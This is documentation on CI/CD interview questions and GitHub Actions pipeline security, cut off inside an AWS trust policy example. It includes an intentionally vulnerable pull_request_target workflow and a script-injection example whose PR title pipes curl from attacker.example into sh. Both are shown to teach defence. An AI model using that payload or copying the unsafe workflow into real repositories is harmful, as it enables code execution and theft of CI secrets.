docs.title: CI/CD Interview Questions and Answers
docs.text: These questions review continuous integration, pipeline design, GitHub Actions, testing and quality gates, artifacts and environment promotion, and pipeline and supply chain security. Try answering each one before reading the answer.

docs.title: 1. What is continuous integration?
docs.text: A practice in which every developer merges small changes into a shared main line at least daily, and every merge is verified by an automated build and tests. Its purpose is to find integration problems while they are small and cheap. A build server running tests on weeks-old branches is automation, not CI.

docs.title: 2. What is the difference between continuous delivery and continuous deployment?
docs.text: Continuous delivery keeps every change on main releasable, with deployment a push-button decision (usually one approval). Continuous deployment releases every change that passes the pipeline automatically, with no manual step. Delivery is the prerequisite for deployment.

docs.title: 3. Why does pipeline speed matter so much?
docs.text: Feedback that arrives in about ten minutes keeps developers focused on the change and encourages small batches. At 30-45 minutes people stop waiting, batch changes, and context-switch, so failures become harder to diagnose and lead time grows. Speed multiplies across every push of every developer.

docs.title: 4. What does "keep the build green" mean in practice?
docs.text: A red main is the team's top priority: the author fixes or, more often, reverts the breaking change within minutes; nobody merges on top of a failure; and flaky tests are quarantined so red always means something. Teams often require up-to-date branches or a merge queue to prevent combination failures.

docs.title: 5. What should a minimum CI pipeline for a Node.js API check?
docs.text: Checkout of the exact commit, the runtime version from .nvmrc, npm ci from the lockfile, lint and format checks, type checks if applicable, unit tests, integration tests against a real database, a build, and dependency and secret scanning. CI should call the same npm run scripts developers use.

docs.title: 6. Why use npm ci instead of npm install in CI?
docs.text: npm ci installs exactly what the lockfile specifies, fails if package.json and the lockfile disagree, and starts from a clean node_modules. npm install may resolve newer versions and rewrite the lockfile, so CI would test something other than what was committed.

docs.title: 7. Name and define DORA's software delivery metrics.
docs.text: Throughput: change lead time (commit to running in production), deployment frequency, and failed deployment recovery time (time to recover from a deployment that needs immediate intervention). Instability: change fail rate (share of deployments needing immediate intervention) and deployment rework rate (share of deployments that are unplanned fixes for production incidents).

docs.title: 8. How should DORA metrics be used?
docs.text: Per application or service, to track improvement over time, using several metrics together because throughput and instability can pull against each other (DORA's research finds they usually improve together). They should not be targets or used to rank teams; mandated targets invite gaming.

docs.title: 9. What runs before merge and what after?
docs.text: Before merge: fast, reliable checks (lint, types, unit and integration tests, build, scans). After merge: slower or less deterministic suites (full end-to-end, performance, long scans), with clear ownership and fast revert, because failures there affect everyone.

docs.title: 10. What is a pipeline's critical path?
docs.text: The longest chain of dependent jobs in the job graph. Wall-clock time equals its length, so speeding up jobs off the critical path saves nothing; parallelize independent checks and shorten the jobs on the path.

docs.title: 11. What does fail-fast mean in pipeline design?
docs.text: Running cheap checks that catch common failures first, and stopping work once a run is doomed. In GitHub Actions matrices, fail-fast: true (the default) cancels the remaining matrix jobs after one fails; set it to false when you need every combination's result.

docs.title: 12. When is a matrix build appropriate?
docs.text: When the variation is real: a library supporting several Node.js versions or operating systems, or sharding one suite across jobs. An application deployed on one runtime should test that runtime; a matrix only adds cost.

docs.title: 13. How should dependency caches be keyed, and what should be cached?
docs.text: On everything that changes the content: OS, runtime version when native modules are built, and the lockfile hash, with a prefix restore-keys fallback. Cache the package manager's download cache (~/.npm), not node_modules. Caches must be optional for correctness.

docs.title: 14. What is the difference between a cache and an artifact?
docs.text: A cache speeds up repeated work, may be evicted, and is never guaranteed to exist. An artifact passes outputs of the current run between jobs or keeps them for people (reports, bundles), with a retention period. Container images go to a registry, not either.

docs.title: 15. What does "build once, deploy many" mean, and why?
docs.text: Build the deployable artifact once per commit and deploy that same artifact to every environment, injecting configuration at deploy time. Rebuilding per environment means production runs bits that were never tested, because dependencies, base images, or flags can change between builds.

docs.title: 16. What makes a build deterministic?
docs.text: Pinned inputs: a committed lockfile with npm ci, base images pinned by digest, pinned tool and action versions, no network fetches after the install step, and no embedded timestamps or paths. Tests also need fixed time, seeds, and isolated data.

docs.title: 17. Why are path filters dangerous for required checks?
docs.text: A workflow skipped by a paths filter never reports its checks, so a required check stays pending and blocks the PR. Run the workflow always and decide inside it, using a change-detection job and conditional jobs (a job skipped by if: reports success).

docs.title: 18. What makes a deploy step idempotent?
docs.text: Running it twice yields the same end state: declaring desired state ("run image digest X", kubectl apply, terraform apply) rather than issuing increments, tracked migrations, immutable inputs, verification after acting, and a concurrency group so two runs cannot deploy at once.

docs.title: 19. Explain workflows, events, jobs, steps, and runners.
docs.text: An event (push, pull request, schedule, manual dispatch, release) starts a workflow defined in .github/workflows/. The workflow is a graph of jobs; each job runs on its own runner and executes ordered steps, each a shell command (run) or an action (uses). Jobs run in parallel unless linked with needs.

docs.title: 20. What is the difference between pull_request and pull_request_target?
docs.text: pull_request runs the PR's merge commit with a read-only token and no secrets for fork PRs. pull_request_target runs the base branch's workflow in the base repository's context, with a write-capable token and secrets. The latter is for metadata tasks only; checking out and running PR code there is a "pwn request".

docs.title: 21. How do outputs pass between steps and jobs?
docs.text: A step writes name=value to $GITHUB_OUTPUT and is read as steps.<id>.outputs.name. A job maps step outputs in outputs:, and later jobs read them as needs.<job>.outputs.name. Reusable workflows map job outputs to workflow outputs.

docs.title: 22. What happens to dependent jobs when a job fails, and why does it matter for branch protection?
docs.text: Jobs that need the failed job are skipped, and a skipped job counts as passing for required checks. Requiring only a downstream job could let a failing PR merge. Use an aggregator job with if: always() that fails when any needed job failed or was cancelled.

docs.title: 23. Compare env, vars, and secrets.
docs.text: env: defines non-sensitive values in the workflow file. vars are configuration variables set in repository, organization, or environment settings, visible in logs. secrets are encrypted, masked in logs, and not given to fork PRs. Environment-level values override repository-level ones and are released only after protection rules pass.

docs.title: 24. What are environments and deployment protection rules?
docs.text: Named deployment targets with their own secrets and variables, guarded by rules: required reviewers (up to six, one approval needed, self-review can be prevented), wait timers, allowed branches or tags, and custom rules from GitHub Apps. Jobs referencing them pause until rules pass and create deployment records.

docs.title: 25. How does concurrency work?
docs.text: Runs or jobs with the same group key do not run simultaneously. With cancel-in-progress: true, a new run cancels the running one (good for superseded PR runs). With false, the new run waits, and a newer pending run replaces an older pending one, so a deploy group holds at most one running and one waiting run.

docs.title: 26. Reusable workflow or composite action?
docs.text: A composite action bundles steps that run inside the caller's job on the caller's runner, receiving values as inputs; good for setup sequences. A reusable workflow (on: workflow_call) supplies whole jobs with their own runners, environments, and secrets; good for standardized build and deploy pipelines across repositories. Pin either to a tag or SHA.

docs.title: 27. What does the permissions block do?
docs.text: It sets the GITHUB_TOKEN's scopes for the workflow or a job; any scope not listed becomes none. Best practice is contents: read at the top and extra scopes (packages: write, id-token: write) only on the jobs that need them. A called reusable workflow can only reduce the caller's permissions.

docs.title: 28. Why don't events created with GITHUB_TOKEN trigger workflows?
docs.text: To prevent recursive runs. Pushes, tags, or PRs created with the default token do not start new workflow runs (except workflow_dispatch and repository_dispatch). Release bots use a GitHub App token, or the follow-up work runs in the same workflow.

docs.title: 29. How do service containers work in GitHub Actions?
docs.text: services: starts containers (such as mongo:8.0) for the job's duration on Linux runners. With health check options, the job waits until the service is healthy. A job running directly on the runner reaches it via mapped ports on localhost; a job running in a container uses the service name as the hostname.

docs.title: 30. Hosted or self-hosted runners?
docs.text: Hosted runners give a fresh, patched VM per job with no maintenance. Self-hosted runners reach private networks and custom hardware but must be patched and secured; persistent self-hosted runners must never run untrusted code such as public fork PRs. Ephemeral self-hosted runners (destroyed after each job) reduce that risk.

docs.title: 31. Compare the test pyramid and the testing trophy.
docs.text: The pyramid favors many fast unit tests, fewer integration tests, and few end-to-end tests. The trophy adds static analysis as the base and makes integration tests the largest layer, arguing they give the most confidence per test for web applications. Both put few, slow end-to-end tests on top.

docs.title: 32. Where should each kind of check run?
docs.text: Formatting and lint in seconds before push and on PRs; type checks and unit tests on PRs; integration tests with service containers on PRs; end- to-end tests on preview or staging environments; performance budgets on PRs (web) or staging (API); canary analysis during production rollout.

docs.title: 33. What is a flaky test, and what causes flakiness?
docs.text: A test that passes and fails on the same code. Causes include fixed sleeps and races, shared state between tests, order dependence, real external services, dates and time zones, randomness without seeds, and slow runners with tight timeouts.

docs.title: 34. How should a team handle flaky tests?
docs.text: Detect them (a retry that passes marks a test as flaky), track counts per test, quarantine the ones blocking many PRs into a non-required job with an owner and deadline, fix the root cause, verify by repeated runs, and restore them. Never normalize re-running until green.

docs.title: 35. What are the limits of code coverage thresholds?
docs.text: Coverage measures executed code, not verified behavior: a test without assertions earns coverage. Thresholds are useful as a floor and a map, ideally "no decrease" on changed code. Mutation testing measures whether tests catch injected bugs.

docs.title: 36. How does test sharding work, and what limits it?
docs.text: Each parallel job runs a deterministic subset (--shard=2/4 in Jest, Vitest, Playwright, or --test-shard in Node.js). Total time is roughly the slowest shard plus setup; uneven test files and per-job setup cost limit the speed-up, and reports must be merged.

docs.title: 37. What are preview environments, and what are the safety rules?
docs.text: Short-lived deployments of one PR, used for end-to-end tests and review. Use test data and credentials only, tear them down on PR close plus a scheduled sweeper, and never deploy fork PRs with secrets.

docs.title: 38. What is a performance budget in CI?
docs.text: A limit enforced by the pipeline, such as a k6 threshold (p(95)<300 ms, error rate below 1%) or Lighthouse CI assertions (performance score, LCP, page weight). The build fails on regression, catching it in the change that caused it.

docs.title: 39. What properties should a deployable artifact have?
docs.text: Immutable, uniquely identified (digest or immutable version), traceable to the commit and build that produced it, and environment-neutral, with configuration and secrets injected at deploy time.

docs.title: 40. Why deploy container images by digest instead of tag?
docs.text: Tags are mutable names that can be repointed; a digest is the hash of the image manifest and always identifies the same image. Deploying by digest guarantees what was tested is what runs and prevents silent upgrades on restarts. Tags remain useful as human-friendly labels.

docs.title: 41. How can you promote an image without rebuilding it?
docs.text: Deploy the digest from the build job to each environment, add a tag with docker buildx imagetools create, copy it to another registry with crane copy or skopeo (the digest stays the same), or commit the digest into a GitOps environment repository.

docs.title: 42. Why is frontend promotion harder, and how do you fix it?
docs.text: Bundlers like Vite inline VITE_* variables at build time, forcing a build per environment. Load non-secret configuration at runtime instead, for example a config.json written at deploy time, so one bundle serves every environment.

docs.title: 43. What should a deployment record contain?
docs.text: The artifact digest and version, commit SHA, pipeline run, environment, who triggered and who approved, time, and result. Such records answer "what is running?", support rollback, and feed DORA metrics.

docs.title: 44. What belongs in a production approval gate?
docs.text: Automated gates (tests green, staging healthy, canary analysis) decide safety; a required reviewer decides timing, with context such as the diff since the last release and test results. Environment rules restrict deploys to main and prevent self-approval.

docs.title: 45. Why are GitHub Actions workflow artifacts not a release store?
docs.text: They exist to pass files between jobs and keep reports, and they expire (90 days by default). Releases belong in registries or release assets with retention policies that protect rollback targets.

docs.title: 46. Why is a CI/CD pipeline a high-value target?
docs.text: It holds credentials that can push code, publish packages, and deploy, and it executes code from many sources: PRs, actions, and dependencies. Compromising a build step can be easier than attacking production and yields broader access.

docs.title: 47. What is script injection in GitHub Actions, and how do you prevent it?
docs.text: ${{ }} expressions are expanded into scripts before the shell runs, so an attacker-controlled value (PR title, branch name, comment) can become commands. Pass such values through env: and quote them; lint workflows with zizmor or actionlint.

docs.title: 48. Why pin actions to full commit SHAs?
docs.text: Tags can be moved to malicious code, as in the 2025 tj-actions/changed-files compromise; a full SHA cannot. Add the version as a comment, let Dependabot propose updates, and enforce pinning with GitHub's Actions policy where available.

docs.title: 49. How do OIDC credentials work for GitHub Actions to AWS?
docs.text: A job with id-token: write requests a signed JWT from GitHub's OIDC provider; it calls AssumeRoleWithWebIdentity; AWS STS verifies the signature and the role's trust policy conditions on aud and sub, and returns temporary credentials. No long-lived keys are stored, and the sub binds access to a repository and environment or branch.

docs.title: 50. What is the sub claim, and why scope it tightly?
docs.text: It identifies the source of the run, for example repo:example/taskflow-api:environment:production or ...:ref:refs/heads/main or ...:pull_request. A trust policy that matches only the production environment prevents other repositories, branches, or PRs from assuming the production role.

docs.title: 51. What do Dependabot and dependency review each do?
docs.text: Dependabot opens PRs for security updates and, if configured, version updates (waiting a default 3-day cooldown for new versions). Dependency review runs on PRs, shows dependency changes, and fails the check for new vulnerable or disallowed-license dependencies.

docs.title: 52. What is an SBOM, and why generate one per release?
docs.text: A machine-readable list (SPDX or CycloneDX) of an artifact's components, versions, licenses, and hashes. When a new vulnerability is disclosed, it tells you quickly which releases and services contain the component.

docs.title: 53. What is provenance, and what do SLSA build levels require?
docs.text: Provenance is a signed record of how an artifact was built. SLSA L1: provenance exists; L2: signed provenance from a hosted build platform; L3: a hardened platform that isolates runs and keeps signing material away from build steps. GitHub artifact attestations alone reach L2; shared reusable build workflows can reach L3.

docs.title: 54. How do secret scanning and push protection differ?
docs.text: Secret scanning finds known secret formats already in the repository and alerts. Push protection blocks pushes containing detected secrets before they land; bypasses require a reason and create alerts. Both complement pre-commit scanners.

docs.title: 55. What are the risks of self-hosted runners and caches?
docs.text: Persistent self-hosted runners let untrusted code leave malware or steal credentials for later jobs; use ephemeral runners and keep untrusted code on hosted runners. Caches shared between low-trust and privileged workflows can be poisoned; avoid caching in release and deploy workflows.

docs.title: 56. The PR pipeline takes 40 minutes and developers have started batching changes. How do you speed it up?
docs.text:
What to check first: per-job durations and the job graph for the slowest runs.

How to confirm: gh run view <id> --json jobs shows which jobs sit on the critical path and how long setup, install, and tests take.

Likely causes and fixes: serial jobs, no dependency caching, slow end-to-end tests before merge, and a single huge test job. Parallelize independent jobs, cache by lockfile, shard long suites, move slow suites after merge, and set a speed budget. See pipeline design.

docs.title: 57. A PR with failing tests was merged even though branch protection requires CI. How?
docs.text:
What to check first: which check is required and how its job relates to the test job.

How to confirm: the required job needs the test job and shows "skipped", which counts as success.

Likely causes and fixes: a skipped dependent job satisfied the rule. Require an aggregator job with if: always() that fails when any needed job failed or was cancelled. See pipeline design.

docs.title: 58. Monorepo PRs touching only docs are stuck on "Expected: waiting for status". Why?
docs.text:
What to check first: whether the required workflow has paths filters.

How to confirm: no run exists for the PR's head commit for that workflow.

Likely causes and fixes: the workflow was skipped, so its check never reported. Run it always and use in-job change detection with conditional jobs. See pipeline design.

docs.title: 59. After enabling the merge queue, nothing merges. What is wrong?
docs.text:
What to check first: the triggers of workflows that provide required checks.

How to confirm: no runs appear for gh-readonly-queue/* refs.

Likely causes and fixes: the workflows lack on: merge_group. Add it to every workflow providing required checks. See GitHub Actions in depth.

docs.title: 60. Integration tests pass locally but fail in CI with connection errors to MongoDB. What do you check?
docs.text:
What to check first: the service container definition, health check, and the connection string's host.

How to confirm: logs show tests starting before MongoDB was ready, or connecting to mongo from a job running directly on the runner.

Likely causes and fixes: no health check, or the wrong host. Add a mongosh ping health check, use localhost with mapped ports for runner jobs (the service name for container jobs), and run integration files serially if they share one database. See GitHub Actions in depth.

docs.title: 61. A third of CI runs need a re-run to pass. What is your plan?
docs.text:
What to check first: which tests fail on one attempt and pass on the next.

How to confirm: the same tests fail intermittently on unchanged commits; retries mark them flaky.

Likely causes and fixes: flaky tests from timing, shared state, or external services. Track flakiness per test, quarantine the worst with owners and deadlines, fix root causes, and stop treating re-runs as the fix. See testing and quality gates.

docs.title: 62. Staging passed, but production fails with the "same release". Why?
docs.text:
What to check first: the image digests running in staging and production.

How to confirm: the digests differ for the same version tag, or the pipeline has separate build jobs per environment.

Likely causes and fixes: rebuilding per environment or a moved tag. Build once, pass the digest as a job output, deploy by digest everywhere, and make release tags immutable. See artifacts and environment promotion.

docs.title: 63. Two production deploys ran at the same time and left mixed versions. How do you prevent it?
docs.text:
What to check first: the deploy job's concurrency configuration.

How to confirm: overlapping runs in the deployments history.

Likely causes and fixes: no concurrency group. Add concurrency: { group: deploy-production, cancel-in-progress: false }, deploy by digest, and verify the rollout in the deploy step. See GitHub Actions in depth.

docs.title: 64. A release workflow triggered by tags never runs after the release bot creates a tag. Why?
docs.text:
What to check first: which token created the tag.

How to confirm: the tag exists, but no workflow run was triggered by it.

Likely causes and fixes: tags created with GITHUB_TOKEN do not trigger workflows. Run publishing in the same workflow gated on the release output, or use a GitHub App token for the bot. See versioning, tags, and releases.

docs.title: 65. An advisory says a GitHub Action you use was compromised last week. What do you do?
docs.text:
What to check first: which workflows reference the action and how (tag or SHA).

How to confirm: gh search code finds the references; run history in the exposure window shows which workflows executed it.

Likely causes and fixes: a tag repointed to malicious code. Rotate every secret those workflows could access, review logs, pin to a verified SHA or remove the action, and enforce SHA pinning by policy. See pipeline and supply chain security.

docs.title: 66. A workflow triggered by a fork PR pushed a commit to main. How did it happen?
docs.text:
What to check first: the triggering event and whether the workflow checked out PR code.

How to confirm: the run used pull_request_target with a checkout of github.event.pull_request.head.sha and a write-capable token.

Likely causes and fixes: a pwn request. Revert, rotate secrets, run untrusted code only under pull_request with read-only permissions, and move privileged follow-ups to a workflow_run workflow that treats PR output as data. See pipeline and supply chain security.

docs.title: 67. The team stores an AWS access key as a secret for deployments. What would you change?
docs.text:
What to check first: where the key is used and what its IAM policy allows.

How to confirm: CloudTrail shows the key's usage pattern and age.

Likely causes and fixes: a long-lived credential that can leak. Set up an IAM OIDC provider for GitHub, a role whose trust policy matches only repo:<org>/<repo>:environment:production, grant id-token: write on the deploy job, use aws-actions/configure-aws-credentials with role-to-assume, and delete the key. See pipeline and supply chain security.

docs.title: 68. The registry cleanup job deleted the image you need for a rollback. How do you prevent it next time?
docs.text:
What to check first: the retention rules and which tags the previous release had.

How to confirm: redeploying the previous digest fails with "manifest unknown"; the cleanup log shows it was expired.

Likely causes and fixes: a policy that expires by count or age without protecting releases. Tag releases with versions excluded from cleanup, protect recently deployed digests, and test rollback regularly. See artifacts and environment promotion.

docs.title: 69. Leadership wants to compare teams by deployment frequency. How do you respond?
docs.text:
What to check first: what decision the comparison is meant to inform.

How to confirm: the services differ in architecture, risk, and release constraints, so raw numbers are not comparable.

Likely causes and fixes: a misuse of DORA metrics. Measure per service, track trends over time, use throughput and instability together, and discuss constraints; DORA warns that targets and rankings lead to gaming. See continuous integration fundamentals.

docs.title: Further learning
docs.text:
• CI/CD overview
  • Continuous integration fundamentals · Pipeline design · GitHub Actions in depth · Testing and quality gates · Artifacts and environment promotion · Pipeline and supply chain security
  • DORA: Software delivery performance metrics
  • GitHub Actions documentation
  • GitHub Docs: Secure use reference

docs.title: Pipeline and Supply Chain Security
docs.text:
A CI/CD pipeline is one of the most privileged systems a team runs. It can push to the repository, publish packages, and deploy to production, and it executes code from many sources: your developers, outside contributors' pull requests, third-party actions, and hundreds of dependencies. Attackers know this; compromising one build step can be easier and more valuable than attacking production directly.

This lesson covers least-privilege permissions, how secrets behave with fork pull requests, the pull_request_target risk, script injection through untrusted input, pinning third-party actions to full commit SHAs, Dependabot and dependency review, OIDC federation instead of long-lived cloud keys (with an AWS example), software bills of materials (SBOMs), artifact attestations and SLSA provenance, and secret scanning with push protection.

docs.title: Why it matters
docs.text: Real supply chain attacks have followed exactly these paths. In 2021 an attacker modified Codecov's Bash Uploader script, which thousands of CI pipelines downloaded and ran, so it exported environment variables (credentials, tokens, keys) from customers' CI runs for about two months. In March 2025 the widely used tj-actions/changed-files GitHub Action was compromised: its version tags were repointed to malicious code that printed CI secrets into workflow logs, which are public for public repositories. Both attacks needed nothing from the victims except that their pipelines trusted a mutable dependency and had secrets within reach. The defenses on this page are mostly configuration: cheap to adopt, and they shrink both the chance and the blast radius of the next incident.

docs.title: Real-world usage
docs.text:
• Codecov, 2021. Codecov's Bash Uploader security update explains that a credential leaked from its Docker image creation process let an attacker alter the uploader script, so any credentials, tokens, or keys available in customers' CI environments could be sent to a third-party server between January 31 and April 1, 2021. A customer detected it by comparing the script's checksum, the kind of integrity check this page recommends.
  • tj-actions/changed-files, 2025. CISA's alert Supply Chain Compromise of Third-Party tj-actions/changed-files (CVE-2025-30066) describes the compromise, which exposed secrets such as access keys, GitHub personal access tokens, npm tokens, and private keys, was potentially enabled by a compromise of reviewdog/action-setup, and advises rotating any exposed secrets. Workflows that pinned the action to a full commit SHA did not run the malicious code.
  • GitHub Security Lab. The articles Preventing pwn requests and Untrusted input document how pull_request_target combined with checking out PR code, and expressions interpolated into scripts, let outside contributors run code with write access and secrets.
  • SLSA and GitHub attestations. The SLSA build levels define provenance requirements (L1 provenance exists, L2 signed provenance from a hosted build platform, L3 a hardened build platform), and GitHub's artifact attestations state that attestations alone provide SLSA v1.0 Build Level 2, and that building in a shared reusable workflow can meet Build Level 3.

Popular tools and providers: GitHub Advanced Security, sold since 2025 as GitHub Secret Protection (secret scanning, push protection) and GitHub Code Security (code scanning, dependency review), Dependabot and Renovate, actions/attest and the GitHub CLI's gh attestation, Sigstore and cosign, Syft and npm sbom for SBOMs, OpenSSF Scorecard, zizmor and actionlint for workflow analysis, gitleaks, and cloud OIDC federation (AWS, Google Cloud, Azure).

docs.title: The pipeline's attack surface
docs.text:
Two principles organize the defenses:

  1. Assume any code in the pipeline may be hostile: PR code, actions, dependencies, and build scripts. Limit what it can reach.
  2. Keep credentials short-lived, narrowly scoped, and separated from untrusted code paths, so a compromise exposes as little as possible.

docs.title: Least-privilege permissions
docs.text:
The GITHUB_TOKEN can do whatever its permissions allow, and every step in the job (including third-party actions and your dependencies' install scripts) can read it. Grant the minimum:

  • Set the organization or repository default to read-only.
  • Put permissions: contents: read at the top of every workflow.
  • Grant extra scopes only on the jobs that need them (packages: write on the publish job, id-token: write on the deploy job).
  • Set persist-credentials: false on actions/checkout unless a later step must push.

A compromised dependency in a job with contents: read can read your code (which it already has); in a job with contents: write it can push a backdoor to main.

docs.title: Secrets and fork pull requests
docs.text:
For pull_request events from forks, GitHub gives the workflow a read-only GITHUB_TOKEN and no secrets (Dependabot PRs similarly receive only Dependabot secrets). This is deliberate: the PR's code runs in the job, and its author is untrusted. Repository settings can also require approval before workflows run for first-time or outside contributors.

Masking replaces secret values in logs with ***, but it is not a security boundary: code that can read a secret can encode it, send it over the network, or split it to defeat masking. The only reliable protection is not exposing secrets to untrusted code at all: keep PR checks secret-free, run secret-dependent jobs after merge, and scope production secrets to protected environments.

docs.title: The pull_request_target risk
docs.text:
pull_request_target runs in the context of the base repository: the workflow file comes from the base branch, the token can write, and secrets are available. That is safe for jobs that only handle metadata (labeling, commenting) and never execute PR code. It becomes a "pwn request" when the workflow checks out the PR's head and runs it:

# DANGEROUS: do not do this
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker-controlled code
      - run: npm ci && npm test                             # runs it with secrets in reach

Any fork can change package.json scripts or tests and run arbitrary code with write access and secrets. Current versions of actions/checkout refuse to check out fork PR code under pull_request_target and workflow_run unless you set allow-unsafe-pr-checkout: true, which is a strong hint never to do it. If a privileged follow-up step needs PR results (for example to post a coverage comment), run the PR code in an unprivileged pull_request workflow, upload its output as an artifact, and let a separate workflow_run workflow treat that artifact strictly as data.

docs.title: Script injection through untrusted input
docs.text:
Expressions are expanded before the shell runs. If an attacker controls the value, they control the script:

# VULNERABLE: a PR titled  x"; curl https://attacker.example/x | sh; echo "  runs the attacker's command
- run: echo "Checking ${{ github.event.pull_request.title }}"

Untrusted values include PR and issue titles and bodies, comments, branch names, commit messages, author names, and workflow_dispatch inputs from less-privileged users. Pass them through environment variables, which the shell treats as data, and quote them:

# SAFE: the value is never parsed as script
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $PR_TITLE"

Static analyzers such as zizmor and actionlint flag these patterns automatically.

docs.title: Pinning third-party actions
docs.text:
uses: owner/action@v4 references a tag, and tags can be moved, which is exactly what happened with tj-actions/changed-files. A full 40-character commit SHA cannot be changed to point at different code:

- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

Practical rules:

  • Pin every third-party action to a full SHA, with the version in a comment so humans and Dependabot can read it.
  • Let Dependabot (package-ecosystem: github-actions) propose SHA updates as reviewable PRs.
  • Restrict which actions may run with organization or repository policy (allowlists); GitHub's Actions policy can also require that actions be pinned to a full-length commit SHA, failing workflows that use tags.
  • Prefer fewer actions: a two-line run: step is often safer than a dependency.
  • Remember that a pinned action can still download mutable code at run time (a Docker image by tag, a script by URL); review what it does.

docs.title: Dependencies: lockfiles, Dependabot, dependency review
docs.text:
Most code in TaskFlow API was written by someone else. Controls that keep dependencies trustworthy:

  • Lockfiles and npm ci: install exactly the reviewed versions with integrity hashes; never npm install in CI.
  • Registry signatures: npm audit signatures verifies registry signatures and provenance attestations of installed packages.
  • Dependabot: security updates open PRs for known vulnerabilities; version updates keep dependencies current, and by default wait 3 days after a release before proposing it (the cooldown setting), which avoids picking up a malicious release in its first hours.
  • Dependency review: on each PR, actions/dependency-review-action shows which dependencies change and fails the check if a new one has a known vulnerability above your threshold or a disallowed license.
  • Scoped private packages: publish internal packages under an npm scope mapped to your private registry, so a public package with the same name cannot be installed by mistake (dependency confusion).
  • Install scripts: postinstall scripts run arbitrary code during npm ci; review new dependencies that use them.

docs.title: OIDC instead of long-lived cloud keys
docs.text:
Storing an AWS access key as a repository secret means a long-lived credential that any job with the secret (or any code that steals it) can use from anywhere, until someone rotates it. OpenID Connect replaces it with short-lived credentials issued per run:

The security comes from the trust policy conditions. The sub (subject) claim encodes where the run came from:

Workflow context sub claim Job with environment: production repo:example/taskflow-api:environment:production Push to a branch (no environment) repo:example/taskflow-api:ref:refs/heads/main Pull request repo:example/taskflow-api:pull_request

A trust policy that only accepts the production environment's subject means a workflow in another repository, on another branch, or in a PR cannot assume the production role, even with id-token: write. Never use a wildcard such as repo:example/* for a role that can deploy.

docs.title: SBOMs
docs.text: A software bill of materials lists every component in an artifact: packages, versions, licenses, and hashes, in a standard format (SPDX or CycloneDX). When the next widely exploited vulnerability is announced, an SBOM per release answers "are we affected, and where?" in minutes. Generate it in CI from the lockfile (npm sbom) or the built image (BuildKit's sbom: true, or Syft), store it with the release, and optionally attest it.

docs.title: Provenance, attestations, and SLSA
docs.text:
Provenance is a signed statement of how an artifact was built: which repository, commit, workflow, and build platform produced which digest. Consumers verify it before deploying, which defeats artifacts built on a laptop or swapped in a registry.

SLSA Build level Requirement Protects against L0 None (nothing) L1 Provenance exists, showing how the package was built Mistakes; easy to forge L2 Signed provenance generated by a hosted build platform Tampering after the build L3 Hardened build platform: runs isolated from each other, signing material inaccessible to user build steps Tampering during the build

On GitHub, actions/attest creates signed provenance for an artifact or image digest (stored by GitHub and optionally pushed to the registry), and gh attestation verify checks it. GitHub states that attestations provide SLSA Build Level 2 on their own, and building in a shared reusable workflow can reach Level 3. npm has the same idea: packages published via trusted publishing from GitHub Actions get provenance automatically.

docs.title: Secret scanning and push protection
docs.text: Secret scanning detects known credential formats in repository content and history and raises alerts (and for many providers, notifies the issuer so the token can be revoked). Push protection blocks a push that contains a detected secret before it ever reaches the repository; a user can bypass with a stated reason, which creates an alert and an audit entry. Push protection for users is on by default for pushes to public repositories; enable it for your repositories and organization too, and pair it with a pre-commit scanner such as gitleaks for earlier feedback.

docs.title: Runners and caches
docs.text:
• Self-hosted runners on public repositories let any fork PR run code on your machine; if the runner persists, the next job (perhaps a deploy) inherits whatever was left behind. Use GitHub-hosted runners for untrusted code, or ephemeral self-hosted runners that are destroyed after one job, isolated from internal networks.
  • Caches shared between low-trust and high-trust workflows can be poisoned. Do not cache in release or deploy workflows unless you must (package-manager-cache: false on actions/setup-node), and never cache secrets.

docs.title: When to use and when not to use
docs.text: Control Use when Notes permissions block Every workflow No exceptions SHA pinning Every third-party action Official actions/* too, ideally; at least a major version tag kept current pull_request_target Labeling, triage, comments that never run PR code Never with a checkout of the PR head OIDC federation Any cloud or service that supports it Fall back to secrets only when no OIDC option exists, and scope them to environments Dependency review Every PR to a deployed codebase Requires the dependency graph; private repositories need the feature on their plan Attestations and provenance Published artifacts, images deployed to production Verify them at deploy time, or they only document SBOMs Releases and production images Store with the release; regenerate per build Ephemeral runners Self-hosted runners that may see untrusted code Persistent runners only for trusted, private repositories

docs.title: A hardened CI workflow skeleton
docs.text:
# .github/workflows/ci.yml
name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read                     # everything else is "none"

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm audit signatures    # registry signatures and provenance
      - run: npm test
      - name: Report the branch safely
        env:
          HEAD_REF: ${{ github.head_ref }}   # attacker-controllable: pass as data
        run: |
          echo "Tested branch: $HEAD_REF" >> "$GITHUB_STEP_SUMMARY"

  workflow-lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - run: pipx run zizmor .github/workflows/

docs.title: Dependabot for npm, actions, and Docker
docs.text:
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 7                # wait a week before proposing new versions
    groups:
      dev-dependencies:
        dependency-type: development
        update-types: [minor, patch]

  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    groups:
      actions:
        patterns: ["*"]              # one PR updates all pinned SHAs

  - package-ecosystem: docker
    directory: /
    schedule:
      interval: weekly

Security updates are separate from these version updates and are not delayed by the cooldown.

docs.title: Dependency review on every pull request
docs.text:
# .github/workflows/dependency-review.yml
name: dependency review
on:
  pull_request:

permissions:
  contents: read
  pull-requests: write               # post the summary comment

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
        with:
          fail-on-severity: high
          allow-licenses: MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC
          comment-summary-in-pr: on-failure

docs.title: OIDC from GitHub Actions to AWS
docs.text:
{
  "Version": "2012-10-17",
  "Statement": [
    {
